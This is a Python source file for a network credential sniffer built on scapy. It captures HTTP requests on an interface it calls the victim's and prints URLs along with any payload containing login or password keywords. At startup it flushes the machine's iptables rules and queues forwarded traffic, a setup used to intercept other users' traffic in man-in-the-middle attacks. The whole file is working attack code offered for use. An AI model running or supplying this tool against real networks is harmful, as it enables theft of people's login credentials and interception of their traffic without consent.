import scapy.all as scapy
from scapy.layers import http
import optparse
import os
import subprocess

# get arguments of interface
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface",
                      help="Interface Web use, see using 'ifconfig'")
    (options, arguments) = parser.parse_args()
    return options.interface


# function get url access
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# funtion to ge passwords and logins
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# process to utils all functions in proccess
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP Request: " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/password" + str(login_info))
            
# sniff information of interface victim
def sniff(interface):
    subprocess.call('iptables --flush', shell=True)
    s_iptable = f'iptables -I FORWARD -j NFQUEUE --queue-num 0'
    subprocess.call(s_iptable, shell=True)
    # pip install scapy_http
    # filter udp; arp; tcp
    # port 21 to passwords tcp
    # port 80 websites
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    

# main function
sniff(get_arguments())

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# pip install netfilterqueue
